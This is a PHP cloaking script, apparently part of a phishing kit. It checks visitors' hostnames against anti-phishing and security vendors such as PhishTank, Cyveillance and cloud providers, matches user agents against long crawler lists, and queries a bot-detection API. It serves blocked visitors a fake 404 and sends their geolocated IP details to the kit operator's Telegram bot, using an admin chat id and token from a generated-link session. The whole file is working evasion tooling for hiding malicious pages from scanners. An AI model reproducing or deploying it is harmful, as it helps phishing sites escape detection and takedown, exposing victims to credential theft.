<?php
$hostname = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
$blocked_words = [
    "above",
    "google",
    "softlayer",
    "amazonaws",
    "cyveillance",
    "phishtank",
    "dreamhost",
    "netpilot",
    "calyxinstitute",
    "tor-exit",
];
foreach ($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		block_access();
    }
}
if (!empty($_SERVER["HTTP_USER_AGENT"])) {
    $userAgents = [
        "Google",
        "Slurp",
        "MSNBot",
        "bot",
        "ia_archiver",
        "Yandex",
        "Rambler",
        "abot",
        "dbot",
        "ebot",
        "hbot",
        "kbot",
        "lbot",
        "mbot",
        "nbot",
        "obot",
        "pbot",
        "rbot",
        "sbot",
        "tbot",
        "vbot",
        "ybot",
        "zbot",
        "bot.",
        "bot/",
        "_bot",
        ".bot",
        "/bot",
        "-bot",
        ":bot",
        "(bot",
        "crawl",
        "slurp",
        "spider",
        "seek",
        "accoona",
        "acoon",
        "adressendeutschland",
        "ah-ha.com",
        "ahoy",
        "altavista",
        "ananzi",
        "anthill",
        "appie",
        "arachnophilia",
        "arale",
        "araneo",
        "aranha",
        "architext",
        "aretha",
        "arks",
        "asterias",
        "atlocal",
        "atn",
        "atomz",
        "augurfind",
        "backrub",
        "bannana_bot",
        "baypup",
        "bdfetch",
        "big brother",
        "biglotron",
        "bjaaland",
        "blackwidow",
        "blaiz",
        "blog",
        "blo.",
        "bloodhound",
        "boitho",
        "booch",
        "bradley",
        "butterfly",
        "calif",
        "cassandra",
        "ccubee",
        "cfetch",
        "charlotte",
        "churl",
        "cienciaficcion",
        "cmc",
        "collective",
        "comagent",
        "combine",
        "computingsite",
        "csci",
        "curl",
        "cusco",
        "daumoa",
        "deepindex",
        "delorie",
        "depspid",
        "deweb",
        "die blinde kuh",
        "digger",
        "ditto",
        "dmoz",
        "docomo",
        "download express",
        "dtaagent",
        "dwcp",
        "ebiness",
        "ebingbong",
        "e-collector",
        "ejupiter",
        "emacs-w3 search engine",
        "esther",
        "evliya celebi",
        "ezresult",
        "falcon",
        "felix ide",
        "ferret",
        "fetchrover",
        "fido",
        "findlinks",
        "fireball",
        "fish search",
        "fouineur",
        "funnelweb",
        "gazz",
        "gcreep",
        "genieknows",
        "getterroboplus",
        "geturl",
        "glx",
        "goforit",
        "golem",
        "grabber",
        "grapnel",
        "gralon",
        "griffon",
        "gromit",
        "grub",
        "gulliver",
        "hamahakki",
        "harvest",
        "havindex",
        "helix",
        "heritrix",
        "hku www octopus",
        "homerweb",
        "htdig",
        "html index",
        "html_analyzer",
        "htmlgobble",
        "hubater",
        "hyper-decontextualizer",
        "ia_archiver",
        "ibm_planetwide",
        "ichiro",
        "iconsurf",
        "iltrovatore",
        "image.kapsi.net",
        "imagelock",
        "incywincy",
        "indexer",
        "infobee",
        "informant",
        "ingrid",
        "inktomisearch.com",
        "inspector web",
        "intelliagent",
        "internet shinchakubin",
        "ip3000",
        "iron33",
        "israeli-search",
        "ivia",
        "jack",
        "jakarta",
        "javabee",
        "jetbot",
        "jumpstation",
        "katipo",
        "kdd-explorer",
        "kilroy",
        "knowledge",
        "kototoi",
        "kretrieve",
        "labelgrabber",
        "lachesis",
        "larbin",
        "legs",
        "libwww",
        "linkalarm",
        "link validator",
        "linkscan",
        "lockon",
        "lwp",
        "lycos",
        "magpie",
        "mantraagent",
        "mapoftheinternet",
        "marvin/",
        "mattie",
        "mediafox",
        "mediapartners",
        "mercator",
        "merzscope",
        "microsoft url control",
        "minirank",
        "miva",
        "mj12",
        "mnogosearch",
        "moget",
        "monster",
        "moose",
        "motor",
        "multitext",
        "muncher",
        "muscatferret",
        "mwd.search",
        "myweb",
        "najdi",
        "nameprotect",
        "nationaldirectory",
        "nazilla",
        "ncsa beta",
        "nec-meshexplorer",
        "nederland.zoek",
        "netcarta webmap engine",
        "netmechanic",
        "netresearchserver",
        "netscoop",
        "newscan-online",
        "nhse",
        "nokia6682/",
        "nomad",
        "noyona",
        "nutch",
        "nzexplorer",
        "objectssearch",
        "occam",
        "omni",
        "open text",
        "openfind",
        "openintelligencedata",
        "orb search",
        "osis-project",
        "pack rat",
        "pageboy",
        "pagebull",
        "page_verifier",
        "panscient",
        "parasite",
        "partnersite",
        "patric",
        "pear.",
        "pegasus",
        "peregrinator",
        "pgp key agent",
        "phantom",
        "phpdig",
        "picosearch",
        "piltdownman",
        "pimptrain",
        "pinpoint",
        "pioneer",
        "piranha",
        "plumtreewebaccessor",
        "pogodak",
        "poirot",
        "pompos",
        "poppelsdorf",
        "poppi",
        "popular iconoclast",
        "psycheclone",
        "publisher",
        "python",
        "rambler",
        "raven search",
        "roach",
        "road runner",
        "roadhouse",
        "robbie",
        "robofox",
        "robozilla",
        "rules",
        "salty",
        "sbider",
        "scooter",
        "scoutjet",
        "scrubby",
        "search.",
        "searchprocess",
        "semanticdiscovery",
        "senrigan",
        "sg-scout",
        "shai'hulud",
        "shark",
        "shopwiki",
        "sidewinder",
        "sift",
        "silk",
        "simmany",
        "site searcher",
        "site valet",
        "sitetech-rover",
        "skymob.com",
        "sleek",
        "smartwit",
        "sna-",
        "snappy",
        "snooper",
        "sohu",
        "speedfind",
        "sphere",
        "sphider",
        "spinner",
        "spyder",
        "steeler/",
        "suke",
        "suntek",
        "supersnooper",
        "surfnomore",
        "sven",
        "sygol",
        "szukacz",
        "tach black widow",
        "tarantula",
        "templeton",
        "/teoma",
        "t-h-u-n-d-e-r-s-t-o-n-e",
        "theophrastus",
        "titan",
        "titin",
        "tkwww",
        "toutatis",
        "t-rex",
        "tutorgig",
        "twiceler",
        "twisted",
        "ucsd",
        "udmsearch",
        "url check",
        "updated",
        "vagabondo",
        "valkyrie",
        "verticrawl",
        "victoria",
        "vision-search",
        "volcano",
        "voyager/",
        "voyager-hc",
        "w3c_validator",
        "w3m2",
        "w3mir",
        "walker",
        "wallpaper",
        "wanderer",
        "wauuu",
        "wavefire",
        "web core",
        "web hopper",
        "web wombat",
        "webbandit",
        "webcatcher",
        "webcopy",
        "webfoot",
        "weblayers",
        "weblinker",
        "weblog monitor",
        "webmirror",
        "webmonkey",
        "webquest",
        "webreaper",
        "websitepulse",
        "websnarf",
        "webstolperer",
        "webvac",
        "webwalk",
        "webwatch",
        "webwombat",
        "webzinger",
        "wget",
        "whizbang",
        "whowhere",
        "wild ferret",
        "worldlight",
        "wwwc",
        "wwwster",
        "xenu",
        "xget",
        "xift",
        "xirq",
        "yandex",
        "yanga",
        "yeti",
        "yodao",
        "zao/",
        "zippp",
        "zyborg",
        "....",
    ];
    foreach ($userAgents as $agent) {
        if (strpos($_SERVER["HTTP_USER_AGENT"], $agent) !== false) {
            block_access();
        }
    }
}
$sistema = $_SERVER["HTTP_USER_AGENT"];
function is_boti($sistema)
{
    $bots = [
        "Googlebot",
        "Baiduspider",
        "ia_archiver",
        "R6_FeedFetcher",
        "NetcraftSurveyAgent",
        "Sogou web spider",
        "bingbot",
        "Yahoo! Slurp",
        "facebookexternalhit",
        "PrintfulBot",
        "msnbot",
        "Twitterbot",
        "UnwindFetchor",
        "urlresolver",
        "Butterfly",
        "TweetmemeBot",
        "PaperLiBot",
        "MJ12bot",
        "AhrefsBot",
        "Exabot",
        "Ezooms",
        "YandexBot",
        "SearchmetricsBot",
        "picsearch",
        "TweetedTimes Bot",
        "QuerySeekerSpider",
        "ShowyouBot",
        "woriobot",
        "merlinkbot",
        "BazQuxBot",
        "Kraken",
        "SISTRIX Crawler",
        "R6_CommentReader",
        "magpie-crawler",
        "GrapeshotCrawler",
        "PercolateCrawler",
        "MaxPointCrawler",
        "R6_FeedFetcher",
        "NetSeer crawler",
        "grokkit-crawler",
        "SMXCrawler",
        "PulseCrawler",
        "Y!J-BRW",
        "80legs.com/webcrawler",
        "Mediapartners-Google",
        "Spinn3r",
        "InAGist",
        "Python-urllib",
        "NING",
        "TencentTraveler",
        "Feedfetcher-Google",
        "mon.itor.us",
        "spbot",
        "Feedly",
        "bitlybot",
        "ADmantX Platform",
        "Niki-Bot",
        "Pinterest",
        "python-requests",
        "DotBot",
        "HTTP_Request2",
        "linkdexbot",
        "A6-Indexer",
        "Baiduspider",
        "TwitterFeed",
        "Microsoft Office",
        "Pingdom",
        "BTWebClient",
        "KatBot",
        "SiteCheck",
        "proximic",
        "Sleuth",
        "Abonti",
        "(BOT for JCE)",
        "Baidu",
        "Tiny Tiny RSS",
        "newsblur",
        "updown_tester",
        "linkdex",
        "baidu",
        "searchmetrics",
        "genieo",
        "majestic12",
        "spinn3r",
        "profound",
        "domainappender",
        "VegeBot",
        "terrykyleseoagency.com",
        "CommonCrawler Node",
        "AdlesseBot",
        "metauri.com",
        "libwww-perl",
        "rogerbot-crawler",
        "MegaIndex.ru",
        "ltx71",
        "Qwantify",
        "Traackr.com",
        "Re-Animator Bot",
        "Pcore-HTTP",
        "BoardReader",
        "omgili",
        "okhttp",
        "CCBot",
        "Java/1.8",
        "semrush.com",
        "feedbot",
        "CommonCrawler",
        "AdlesseBot",
        "MetaURI",
        "ibwww-perl",
        "rogerbot",
        "MegaIndex",
        "BLEXBot",
        "FlipboardProxy",
        "techinfo@ubermetrics-technologies.com",
        "trendictionbot",
        "Mediatoolkitbot",
        "trendiction",
        "ubermetrics",
        "ScooperBot",
        "TrendsmapResolver",
        "Nuzzel",
        "Go-http-client",
        "Applebot",
        "LivelapBot",
        "GroupHigh",
        "SemrushBot",
        "ltx71",
        "commoncrawl",
        "istellabot",
        "DomainCrawler",
        "cs.daum.net",
        "StormCrawler",
        "GarlikCrawler",
        "The Knowledge AI",
        "getstream.io/winds",
        "YisouSpider",
        "archive.org_bot",
        "semantic-visions.com",
        "FemtosearchBot",
        "360Spider",
        "linkfluence.com",
        "glutenfreepleasure.com",
        "Gluten Free Crawler",
        "YaK/1.0",
        "Cliqzbot",
        "app.hypefactors.com",
        "axios",
        "semantic-visions.com",
        "webdatastats.com",
        "schmorp.de",
        "SEOkicks",
        "DuckDuckBot",
        "Barkrowler",
        "ZoominfoBot",
        "Linguee Bot",
        "Mail.RU_Bot",
        "OnalyticaBot",
        "Linguee Bot",
        "admantx-adform",
        "Buck/2.2",
        "Barkrowler",
        "Zombiebot",
        "Nutch",
        "SemanticScholarBot",
        "Jetslide",
        "scalaj-http",
        "XoviBot",
        "sysomos.com",
        "PocketParser",
        "newspaper",
        "serpstatbot",
        "MetaJobBot",
        "SeznamBot/3.2",
        "VelenPublicWebCrawler/1.0",
        "WordPress.com mShots",
        "adscanner",
        "BacklinkCrawler",
        "netEstate NE Crawler",
        "Astute SRM",
        "GigablastOpenSource/1.0",
        "DomainStatsBot",
        "Winds: Open Source RSS & Podcast",
        "dlvr.it",
        "BehloolBot",
        "7Siters",
        "AwarioSmartBot",
        "Apache-HttpClient/5",
        "Seekport Crawler",
        "AHC/2.1",
        "eCairn-Grabber",
        "mediawords bot",
        "PHP-Curl-Class",
        "Scrapy",
        "curl/7",
        "Blackboard",
        "NetNewsWire",
        "node-fetch",
        "admantx",
        "metadataparser",
        "Domains Project",
        "SerendeputyBot",
        "Moreover",
        "DuckDuckGo",
        "monitoring-plugins",
        "Selfoss",
        "Adsbot",
        "acebookexternalhit",
        "SpiderLing",
        "Cocolyzebot",
        "AhrefsBot",
        "TTD-Content",
        "superfeedr",
        "Twingly",
        "Google-Apps-Scrip",
        "LinkpadBot",
        "CensysInspect",
        "Reeder",
        "tweetedtimes",
        "Amazonbot",
        "MauiBot",
        "Symfony BrowserKit",
        "DataForSeoBot",
    ];
    foreach ($bots as $b) {
        if (stripos($sistema, $b) !== false) {
            return true;
        }
    }
    return false;
}
if (is_boti($sistema)) {
    block_access();
} else {
}
function is_bot()
{
    $spiders = [
        "abot",
        "dbot",
        "ebot",
        "hbot",
        "kbot",
        "lbot",
        "mbot",
        "nbot",
        "obot",
        "pbot",
        "rbot",
        "sbot",
        "tbot",
        "vbot",
        "ybot",
        "zbot",
        "bot.",
        "bot/",
        "_bot",
        ".bot",
        "/bot",
        "-bot",
        ":bot",
        "(bot",
        "crawl",
        "slurp",
        "spider",
        "seek",
        "accoona",
        "acoon",
        "adressendeutschland",
        "ah-ha.com",
        "ahoy",
        "altavista",
        "ananzi",
        "anthill",
        "appie",
        "arachnophilia",
        "arale",
        "araneo",
        "aranha",
        "architext",
        "aretha",
        "arks",
        "asterias",
        "atlocal",
        "atn",
        "atomz",
        "augurfind",
        "backrub",
        "bannana_bot",
        "baypup",
        "bdfetch",
        "big brother",
        "biglotron",
        "bjaaland",
        "blackwidow",
        "blaiz",
        "blog",
        "blo.",
        "bloodhound",
        "boitho",
        "booch",
        "bradley",
        "butterfly",
        "calif",
        "cassandra",
        "ccubee",
        "cfetch",
        "charlotte",
        "churl",
        "cienciaficcion",
        "cmc",
        "collective",
        "comagent",
        "combine",
        "computingsite",
        "csci",
        "curl",
        "cusco",
        "daumoa",
        "deepindex",
        "delorie",
        "depspid",
        "deweb",
        "die blinde kuh",
        "digger",
        "ditto",
        "dmoz",
        "docomo",
        "download express",
        "dtaagent",
        "dwcp",
        "ebiness",
        "ebingbong",
        "e-collector",
        "ejupiter",
        "emacs-w3 search engine",
        "esther",
        "evliya celebi",
        "ezresult",
        "falcon",
        "felix ide",
        "ferret",
        "fetchrover",
        "fido",
        "findlinks",
        "fireball",
        "fish search",
        "fouineur",
        "funnelweb",
        "gazz",
        "gcreep",
        "genieknows",
        "getterroboplus",
        "geturl",
        "glx",
        "goforit",
        "golem",
        "grabber",
        "grapnel",
        "gralon",
        "griffon",
        "gromit",
        "grub",
        "gulliver",
        "hamahakki",
        "harvest",
        "havindex",
        "helix",
        "heritrix",
        "hku www octopus",
        "homerweb",
        "htdig",
        "html index",
        "html_analyzer",
        "htmlgobble",
        "hubater",
        "hyper-decontextualizer",
        "ia_archiver",
        "ibm_planetwide",
        "ichiro",
        "iconsurf",
        "iltrovatore",
        "image.kapsi.net",
        "imagelock",
        "incywincy",
        "indexer",
        "infobee",
        "informant",
        "ingrid",
        "inktomisearch.com",
        "inspector web",
        "intelliagent",
        "internet shinchakubin",
        "ip3000",
        "iron33",
        "israeli-search",
        "ivia",
        "jack",
        "jakarta",
        "javabee",
        "jetbot",
        "jumpstation",
        "katipo",
        "kdd-explorer",
        "kilroy",
        "knowledge",
        "kototoi",
        "kretrieve",
        "labelgrabber",
        "lachesis",
        "larbin",
        "legs",
        "libwww",
        "linkalarm",
        "link validator",
        "linkscan",
        "lockon",
        "lwp",
        "lycos",
        "magpie",
        "mantraagent",
        "mapoftheinternet",
        "marvin/",
        "mattie",
        "mediafox",
        "mediapartners",
        "mercator",
        "merzscope",
        "microsoft url control",
        "minirank",
        "miva",
        "mj12",
        "mnogosearch",
        "moget",
        "monster",
        "moose",
        "motor",
        "multitext",
        "muncher",
        "muscatferret",
        "mwd.search",
        "myweb",
        "najdi",
        "nameprotect",
        "nationaldirectory",
        "nazilla",
        "ncsa beta",
        "nec-meshexplorer",
        "nederland.zoek",
        "netcarta webmap engine",
        "netmechanic",
        "netresearchserver",
        "netscoop",
        "newscan-online",
        "nhse",
        "nokia6682/",
        "nomad",
        "noyona",
        "nutch",
        "nzexplorer",
        "objectssearch",
        "occam",
        "omni",
        "open text",
        "openfind",
        "openintelligencedata",
        "orb search",
        "osis-project",
        "pack rat",
        "pageboy",
        "pagebull",
        "page_verifier",
        "panscient",
        "parasite",
        "partnersite",
        "patric",
        "pear.",
        "pegasus",
        "peregrinator",
        "pgp key agent",
        "phantom",
        "phpdig",
        "picosearch",
        "piltdownman",
        "pimptrain",
        "pinpoint",
        "pioneer",
        "piranha",
        "plumtreewebaccessor",
        "pogodak",
        "poirot",
        "pompos",
        "poppelsdorf",
        "poppi",
        "popular iconoclast",
        "psycheclone",
        "publisher",
        "python",
        "rambler",
        "raven search",
        "roach",
        "road runner",
        "roadhouse",
        "robbie",
        "robofox",
        "robozilla",
        "rules",
        "salty",
        "sbider",
        "scooter",
        "scoutjet",
        "scrubby",
        "search.",
        "searchprocess",
        "semanticdiscovery",
        "senrigan",
        "sg-scout",
        "shai'hulud",
        "shark",
        "shopwiki",
        "sidewinder",
        "sift",
        "silk",
        "simmany",
        "site searcher",
        "site valet",
        "sitetech-rover",
        "skymob.com",
        "sleek",
        "smartwit",
        "sna-",
        "snappy",
        "snooper",
        "sohu",
        "speedfind",
        "sphere",
        "sphider",
        "spinner",
        "spyder",
        "steeler/",
        "suke",
        "suntek",
        "supersnooper",
        "surfnomore",
        "sven",
        "sygol",
        "szukacz",
        "tach black widow",
        "tarantula",
        "templeton",
        "/teoma",
        "t-h-u-n-d-e-r-s-t-o-n-e",
        "theophrastus",
        "titan",
        "titin",
        "tkwww",
        "toutatis",
        "t-rex",
        "tutorgig",
        "twiceler",
        "twisted",
        "ucsd",
        "udmsearch",
        "url check",
        "updated",
        "vagabondo",
        "valkyrie",
        "verticrawl",
        "victoria",
        "vision-search",
        "volcano",
        "voyager/",
        "voyager-hc",
        "Go-http-client",
        "w3c_validator",
        "w3m2",
        "w3mir",
        "walker",
        "wallpaper",
        "wanderer",
        "wauuu",
        "wavefire",
        "web core",
        "web hopper",
        "web wombat",
        "webbandit",
        "webcatcher",
        "webcopy",
        "webfoot",
        "weblayers",
        "weblinker",
        "weblog monitor",
        "webmirror",
        "webmonkey",
        "webquest",
        "webreaper",
        "websitepulse",
        "websnarf",
        "webstolperer",
        "webvac",
        "webwalk",
        "webwatch",
        "webwombat",
        "webzinger",
        "wget",
        "whizbang",
        "whowhere",
        "wild ferret",
        "worldlight",
        "wwwc",
        "wwwster",
        "xenu",
        "xget",
        "xift",
        "xirq",
        "yandex",
        "yanga",
        "yeti",
        "yodao",
        "zao/",
        "zippp",
        "zyborg",
        "....",
    ];
    foreach ($spiders as $spider) {
        if (stripos($_SERVER["HTTP_USER_AGENT"], $spider) !== false) {
            return true;
        }
    }
    return false;
}
if (is_bot()) {
    block_access();
} else {
}
function isCrawler()
{
    $agent = strtolower($_SERVER["HTTP_USER_AGENT"]);
    if (!empty($agent)) {
        $spiderSite = [
            "TencentTraveler",
            "Baiduspider+",
            "BaiduGame",
            "Googlebot",
            "msnbot",
            "Sosospider+",
            "Sogou web spider",
            "ia_archiver",
            "Yahoo! Slurp",
            "YoudaoBot",
            "Yahoo Slurp",
            "MSNBot",
            "Java (Often spam bot)",
            "BaiDuSpider",
            "Voila",
            "Yandex bot",
            "BSpider",
            "twiceler",
            "Sogou Spider",
            "Speedy Spider",
            "Google AdSense",
            "Heritrix",
            "Python-urllib",
            "Alexa (IA Archiver)",
            "Ask",
            "Exabot",
            "Custo",
            "OutfoxBot/YodaoBot",
            "yacy",
            "SurveyBot",
            "legs",
            "lwp-trivial",
            "Nutch",
            "StackRambler",
            "The web archive (IA Archiver)",
            "Perl tool",
            "MJ12bot",
            "Netcraft",
            "MSIECrawler",
            "WGet tools",
            "larbin",
            "Fish search",
        ];
        foreach ($spiderSite as $val) {
            $str = strtolower($val);
            if (strpos($agent, $str) !== false) {
                return true;
            }
        }
    } else {
        return false;
    }
}
if (isCrawler()) {
    block_access();
} else {
}



function block_access(){
	
	$IP = antibot_getIP();
	$browser = antibot_getBrowser();
	$os = antibot_getOS($_SERVER['HTTP_USER_AGENT']);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $IP);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$ip_data_in = curl_exec($ch);
	curl_close($ch);
	$ip_data = json_decode($ip_data_in, true);
	$country = $ip_data["country"];
	$city = $ip_data["city"];
	$isp = $ip_data["isp"];
	$org = $ip_data["org"];
	$as = $ip_data["as"];
	$code = $ip_data["zip"];
	$timezone = $ip_data["timezone"];
	$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
	$browser_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
	
	
	$message = "---------------------------------------
🚫 BOT ACCESS HAS BEEN DENIED 🚫
---------------------------------------
🔗 URL => #https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."
🌎 IP Address => ".$IP."
📅 TimeStamp => ".date('d/m/Y H:i:s')."
🌐 Lang => $browser_language
🛫 Country => ".$country."
🏙 City => ".$city."
⌨️ Browser => ".$user_agent."
🖥 OS => ".$os."
📫 Postal Code => " . $code . "
🕛 Time Zone => " . $timezone . "
⚡ Connection => " . $isp . "
🆔 Known => " . $as . "
🏢 ORG => " . $org . "";
	
	$chat_id = $_SESSION['Link']['GeneratedLink']['admin_chat_id'];
	$token = $_SESSION['Link']['GeneratedLink']['admin_telegram_bot'];
	
	send_report($chat_id,$token,$message);
	header("HTTP/1.0 404 Not Found");
	die();
}

//new bot detection
//check_browser_language();
check_real_bots();

function antibot_getIP(){
	$ip = "";
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	if($ip=="::1"){
		$ip= "136.158.10.96";
	}
	return $ip;
}

function antibot_getOS($user_agent) { 
	$os_platform  = "Unknown OS Platform";
	$os_array     = array(
	  '/windows nt 10/i'      =>  'Windows 10',
	  '/windows nt 6.3/i'     =>  'Windows 8.1',
	  '/windows nt 6.2/i'     =>  'Windows 8',
	  '/windows nt 6.1/i'     =>  'Windows 7',
	  '/windows nt 6.0/i'     =>  'Windows Vista',
	  '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	  '/windows nt 5.1/i'     =>  'Windows XP',
	  '/windows xp/i'         =>  'Windows XP',
	  '/windows nt 5.0/i'     =>  'Windows 2000',
	  '/windows me/i'         =>  'Windows ME',
	  '/win98/i'              =>  'Windows 98',
	  '/win95/i'              =>  'Windows 95',
	  '/win16/i'              =>  'Windows 3.11',
	  '/macintosh|mac os x/i' =>  'Mac OS X',
	  '/mac_powerpc/i'        =>  'Mac OS 9',
	  '/linux/i'              =>  'Linux',
	  '/ubuntu/i'             =>  'Ubuntu',
	  '/iphone/i'             =>  'iPhone',
	  '/ipod/i'               =>  'iPod',
	  '/ipad/i'               =>  'iPad',
	  '/android/i'            =>  'Android',
	  '/blackberry/i'         =>  'BlackBerry',
	  '/webos/i'              =>  'Mobile'
	);

	foreach ($os_array as $regex => $value)
		if (preg_match($regex, $user_agent))
			$os_platform = $value;

	return $os_platform;
}

function antibot_getBrowser(){
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$name = 'NA';

	if (preg_match('/MSIE/i', $agent) && !preg_match('/Opera/i', $agent)) {
		$name = 'Internet Explorer';
	} elseif (preg_match('/Firefox/i', $agent)) {
		$name = 'Mozilla Firefox';
	} elseif (preg_match('/Chrome/i', $agent)) {
		$name = 'Google Chrome';
	} elseif (preg_match('/Safari/i', $agent)) {
		$name = 'Apple Safari';
	} elseif (preg_match('/Opera/i', $agent)) {
		$name = 'Opera';
	} elseif (preg_match('/Netscape/i', $agent)) {
		$name = 'Netscape';
	}
	return $name;
}


function check_browser_language(){
	if(!isset($_SERVER["HTTP_ACCEPT_LANGUAGE"]) || ($_SERVER["HTTP_ACCEPT_LANGUAGE"] == null || trim($_SERVER["HTTP_ACCEPT_LANGUAGE"]) == '') ){
		block_access();
	}
}

function check_real_bots(){
	$ip = antibot_getIP();
	$url = "https://api.ipdetective.io/ip/$ip?info=true";
	$response = antibot_get_web_response($url);
	$response = json_decode($response[2], true);
	
	$is_bot = $response['bot'] ?? false;
	$is_bot = (bool) $is_bot;
	$type = $response['type'] ?? false;

	if($is_bot || $type=='bot'){
		block_access();
	}
}

function send_report($chat_id,$token,$msg){
	$data = [
		'chat_id' => $chat_id,
		'text' => $msg,
		'parse_mode'=>'html'
	];
	
	$url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data);
	$curl = curl_init($url);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

	//for debug only!
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

	$response = curl_exec($curl);
	return $response;
}


function antibot_get_web_response($url,$data='',$header=array(),$method='GET',$ua='iBypasser Agent',$authorization=null){
	$ch = curl_init($url);
	curl_setopt($ch ,CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
	curl_setopt($ch, CURLOPT_USERAGENT, $ua);   
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
	
	if(strtoupper($method=='POST') || strtoupper($method=='PUT')){
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	}
	
	// curl_setopt($ch, CURLOPT_ENCODING, 'UTF-8');
	if($authorization!==null){
		curl_setopt($ch, CURLOPT_USERPWD, $authorization);
	}
	  
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_VERBOSE, true);

	
	curl_setopt($ch, CURLOPT_HEADER, true);
	$result_with_headers = curl_exec($ch);
	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	
	$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
	$body = substr($result_with_headers, $header_size);
	$redirectURL = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL );
	curl_close($ch);
	
	return array($result_with_headers,$httpcode,$body,$redirectURL);
}

?>